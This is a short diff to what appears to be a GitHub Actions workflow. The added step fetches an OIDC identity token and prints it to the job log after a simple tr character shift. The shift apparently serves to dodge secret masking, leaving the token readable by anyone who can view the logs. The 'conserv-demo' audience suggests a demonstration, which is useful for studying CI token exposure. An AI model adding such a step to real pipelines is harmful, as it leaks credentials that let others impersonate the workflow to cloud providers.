@@ -8,4 +8,5 @@ jobs:
       id-token: write
     steps:
       - run: |
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=conserv-demo"
+          jwt=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=conserv-demo")
+          echo $jwt | tr 'a-y0-8' 'b-z1-9'
